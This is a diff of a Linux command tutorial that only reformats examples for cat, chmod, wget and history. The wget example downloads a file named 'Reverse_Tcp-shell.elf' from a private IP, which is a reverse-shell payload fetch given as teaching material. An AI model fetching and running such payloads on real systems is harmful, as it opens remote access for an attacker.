@@ -114,11 +114,13 @@ CAT is an acronym for concatenate. It combines: concatenates, files or prints te
 <pre>$ cat file_1 file_2 > Combined_File_3</pre>
 <pre>$ cat nally.txt</pre>
 <pre>$ cat ./-weird_Office-file_name(2).docx.docx</pre>
-Display a file with a dash in the name with ./
-**e. chmod**<br>
+Display a file with a dash in the name with (./)
+
+**e. chmod** <br>
 Change mode allows you to change file mode bits. In **.nix** environments, file and folder permissions are displayed with the ls command, beginning with: Directory/Link: 1 bit, followed by: user/group/owner with 3 bits each: (-DUUUGGGOOO) The: + operator adds selected file mode bits, and: - removes them. So to give the current user and group execute permissions on a file try this:
 <pre>$ chmod ug+x Endless_ping_loop.sh</pre>
-Now run the executable file with ./file_name.ext
+<pre>$ ./file_name.ext</pre>
+Execute the file with (./)
 **f. wget**<br>
 This neat tool is known as the non-interactive network downloader. And it does just that, this command downloads a file from a remote server.
 <pre>$ wget http://192.168.53.4/files/Reverse_Tcp-shell.elf </pre>
@@ -131,7 +133,7 @@ Make a hexdump or do the reverse. This simple command uses -r: reverse, to conve
 **i. history**<br>
 This simple command shows a numbered list of the previous commands you have entered since you last erased your Bash history.
 <pre>$ history</pre>
-$ 1 ls -al
+<pre>1 ls -al
   2 cd ../our/parents/child/dir
   3 whoami
   4 echo hello > foo.bar</pre>
